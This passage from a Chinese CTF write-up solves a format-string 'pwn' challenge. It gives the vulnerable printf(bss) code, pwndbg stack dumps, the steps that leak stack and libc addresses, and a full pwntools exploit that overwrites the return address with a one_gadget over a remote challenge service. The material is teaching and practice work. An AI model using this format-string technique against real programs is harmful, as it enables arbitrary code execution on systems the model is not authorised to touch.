punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is the %d time\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter a keyword\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>总体来讲，代码逻辑还是比较简单，漏洞也非常的明显。签到题实锤了确实</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> bss<span class=\"token punctuation\">,</span> <span class=\"token number\">0x40uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>bss<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>5 次机会，第一次不用多想泄露地址</p>\n<blockquote>\n<p>00:0000│ rsp 0x7fffffffdcd0  —▸ 0x7fffffffddc0 ◂— 0x1<br>\n01:0008│        0x7fffffffdcd8 ◂— 0x0<br>\n02:0010│ rbp 0x7fffffffdce0  —▸ 0x400840 ( <code>__libc_csu_init</code> ) ◂— 0x41ff894156415741<br>\n03:0018│        0x7fffffffdce8  —▸ 0x7ffff7820840 ( <code>__libc_start_main</code> +240) ◂— 0x31000197f9e8c789<br>\n04:0020│        0x7fffffffdcf0 ◂— 0x1<br>\n05:0028│        0x7fffffffdcf8  —▸ 0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /* ‘./pwn’ */</p>\n</blockquote>\n<p>stack_addr：  <code>00:0000│ rsp 0x7fffffffdcd0  —▸ 0x7fffffffddc0 ◂— 0x1</code>   ——&gt;  <code>%6$p</code></p>\n<p>libc_addr:     <code>0x7fffffffdce8  —▸ 0x7ffff7820840 (__libc_start_main+240) ◂— ..</code> ——&gt;  <code>%9$p</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%6$p-%9$p'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0x7fffffffddc0 - 0x7fffffffdce8</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"-0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>libcbase <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到两个地址之后，就是用诸葛连弩打非栈上格式化字符。</p>\n<p><code>ret_addr : 0x7fffffffdce8</code></p>\n<p>用格式化字符串将其改成 ogg_addr 即可</p>\n<blockquote>\n<p>pwndbg&gt; stack 40<br>\n00:0000│ rsp 0x7fffffffdcd0 —▸ 0x7fffffffddc0 ◂— 0x1<br>\n01:0008│     0x7fffffffdcd8 ◂— 0x100000000<br>\n02:0010│ rbp 0x7fffffffdce0 —▸ 0x400840 (__libc_csu_init) ◂— 0x41ff894156415741<br>\n03:0018│     0x7fffffffdce8 —▸ 0x7ffff7820840 (__libc_start_main+240) ◂— 0x31000197f9e8c789<br>\n04:0020│     0x7fffffffdcf0 ◂— 0x1<br>\n05:0028│     0x7fffffffdcf8 —▸ 0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /* ‘./pwn’ <em>/<br>\n06:0030│     0x7fffffffdd00 ◂— 0x1f7e25ca0<br>\n07:0038│     0x7fffffffdd08 —▸ 0x400767 (main) ◂— 0x10ec8348e5894855<br>\n08:0040│     0x7fffffffdd10 ◂— 0x0<br>\n09:0048│     0x7fffffffdd18 ◂— 0x63d45a5b7410892e<br>\n0a:0050│     0x7fffffffdd20 —▸ 0x400610 (_start) ◂— 0x89485ed18949ed31<br>\n0b:0058│     0x7fffffffdd28 —▸ 0x7fffffffddc0 ◂— 0x1<br>\n0c:0060│     0x7fffffffdd30 ◂— 0x0<br>\n0d:0068│     0x7fffffffdd38 ◂— 0x0<br>\n0e:0070│     0x7fffffffdd40 ◂— 0x9c2ba524dd70892e<br>\n0f:0078│     0x7fffffffdd48 ◂— 0x9c2bb5df6b60892e<br>\n10:0080│     0x7fffffffdd50 ◂— 0x0<br>\n… ↓        2 skipped<br>\n13:0098│     0x7fffffffdd68 —▸ 0x7fffffffddd8 —▸ 0x7fffffffe169 ◂— ‘SHELL=/bin/bash’<br>\n14:00a0│     0x7fffffffdd70 —▸ 0x7ffff7e27168 ◂— 0x0<br>\n15:00a8│     0x7fffffffdd78 —▸ 0x7ffff7c1080b ◂— 0xc48348001f0fd3eb<br>\n16:00b0│     0x7fffffffdd80 ◂— 0x0<br>\n17:00b8│     0x7fffffffdd88 ◂— 0x0<br>\n18:00c0│     0x7fffffffdd90 —▸ 0x400610 (_start) ◂— 0x89485ed18949ed31<br>\n19:00c8│     0x7fffffffdd98 —▸ 0x7fffffffddc0 ◂— 0x1<br>\n1a:00d0│     0x7fffffffdda0 ◂— 0x0<br>\n1b:00d8│     0x7fffffffdda8 —▸ 0x400639 (_start+41) ◂— 0xb80000441f0f66f4<br>\n1c:00e0│     0x7fffffffddb0 —▸ 0x7fffffffddb8 ◂— 0x1c<br>\n1d:00e8│     0x7fffffffddb8 ◂— 0x1c<br>\n1e:00f0│ r13 0x7fffffffddc0 ◂— 0x1<br>\n1f:00f8│     0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /</em> ‘./pwn’ */<br>\n20:0100│     0x7fffffffddd0 ◂— 0x0<br>\n21:0108│     0x7fffffffddd8 —▸ 0x7fffffffe169 ◂— ‘SHELL=/bin/bash’<br>\n22:0110│     0x7fffffffdde0 —▸ 0x7fffffffe179 ◂— ‘SESSION_MANAGER=local/h711:@/tmp/.ICE-unix/2518,unix/h711:/tmp/.ICE-unix/2518’<br>\n23:0118│     0x7fffffffdde8 —▸ 0x7fffffffe1c7 ◂— ‘QT_ACCESSIBILITY=1’<br>\n24:0120│     0x7fffffffddf0 —▸ 0x7fffffffe1da ◂— ‘COLORTERM=truecolor’<br>\n25:0128│     0x7fffffffddf8 —▸ 0x7fffffffe1ee ◂— ‘XDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu-xorg:/etc/xdg’<br>\n26:0130│     0x7fffffffde00 —▸ 0x7fffffffe220 ◂— ‘SSH_AGENT_LAUNCHER=gnome-keyring’<br>\n27:0138│     0x7fffffffde08 —▸ 0x7fffffffe241 ◂— ‘XDG_MENU_PREFIX=gnome-’</p>\n</blockquote>\n<p>在 %11$p 处，我们修改 <code>0x7fffffffe163 </code> 低 2 字节修改成返回地址 <code>0xdce8</code></p>\n<blockquote>\n<p>05:0028│     0x7fffffffdcf8 —▸ 0x7fffffffddc8 —▸ 0x7fffffffe163 ◂— 0x4853006e77702f2e /* ‘./pwn’ */</p>\n</blockquote>\n<p>这样 <code>0x7fffffffddc8</code>  在 %37$p 处，就会指向返回地址。接着我们修改 %37 处即可</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>input1 <span class=\"token operator\">=</span> stack1<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>input2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>stack1<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xffff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%11$hn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'%'</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>og<span class=\"token operator\">>></span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'c%37$hhn'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h4 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> EXP</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>huan_attack_pwn</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># from LibcSearcher import *</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># context(arch='i386' , os='linux', log_level='debug')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>binary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwn'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>libc <span class=\"token operator\">=</span> <span class=\"token string\">'./libc.so.6'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>host<span class=\"token punctuation\">,</span> port <span class=\"token operator\">=</span> <span class=\"token string\">\"node5.buuoj.cn:28082\"</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\":\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'\\033[31;40mremote\\033[0m: (y)\\n'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token string\">'\\033[32;40mprocess\\033[0m: (n)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">if</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'y'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># r = gdb.debug(binary)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># libc = cdll.LoadLibrary(libc)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #设置种子</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>default <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data              <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>                <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> time<span class=\"token operator\">=</span>default             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rpu     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims<span class=\"token punctuation\">,</span> time<span class=\"token operator\">=</span>default     <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">,</span>timeout<span class=\"token operator\">=</span>time<span class=\"token punctuation\">,</span>drop<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data                     <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length                   <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> ：0x</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span>var_name<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token format-spec\">x</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>aaaaaaaa-0x601089-0x40-0x7ffff78f7360-0x7ffff7ff7700-0x13-0x7fffffffddc0-(nil)-0x400840-0x7ffff7820840</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>00:0000│  0x7fffffffddc0 —▸ 0x7fffffffe2b7 ◂— 'SSH_AUTH_SOCK=/run/user/1000/keyring/ssh'</pre></td></tr><tr><td data-num=\"51\"></td><td><pre>00:0000│  0x7ffff7820840 (__libc_start_main+240) ◂— 0x31000197f9e8c789</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token comment\">#  ► 0x7ffff784ffa1    call   qword ptr [rax + 0x38]        &lt;_IO_file_xsputn></span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token comment\">#  ► 0x7ffff7879397 &lt;_IO_file_xsputn+423>    call   qword ptr [rax + 0x78]        &lt;_IO_file_write></span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># b * 0x400825</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%6$p-%9$p'</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please enter a keyword\\n'</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>stack <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#0x7fffffffddc0 - 0x7fffffffdce8</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">\"-0x\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>libcbase <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span> <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>system <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"65\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libcbase'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>stack1 <span class=\"token operator\">=</span> stack <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7fffffffddc0</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7fffffffdce8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">\"stack1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>ogg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x4527a</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf03a4</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xf1247</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>og <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> ogg<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'og'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 